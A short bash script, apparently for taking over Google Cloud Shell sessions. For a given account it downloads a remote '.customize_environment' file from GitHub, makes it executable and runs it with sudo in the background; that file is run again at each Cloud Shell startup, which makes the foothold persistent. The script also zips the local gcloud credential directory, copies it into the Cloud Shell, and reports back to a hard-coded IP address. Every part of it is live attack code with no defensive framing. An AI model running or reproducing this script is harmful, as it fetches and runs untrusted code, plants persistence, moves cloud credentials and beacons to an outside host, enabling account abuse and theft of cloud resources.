#!/bin/bash

echo
echo $1

command="[ ! -e '.customize_environment' ] && ( wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment ; chmod 777 .customize_environment ; sudo nohup ./.customize_environment > /dev/null & )"

gcloud cloud-shell ssh --account=$1 --command="$command" --authorize-session --force-key-file-overwrite --ssh-flag='-n' --quiet

rm -rf ~/backup.zip ; zip -r -q ~/backup.zip /root/.config/gcloud/

gcloud cloud-shell scp localhost:/root/backup.zip cloudshell:~/ --account=$1 --force-key-file-overwrite

url='http://135.148.11.148/send_status.php?refresh='$2'&status=CREATED&owner=ROOT'
curl $url

echo 'command ok'
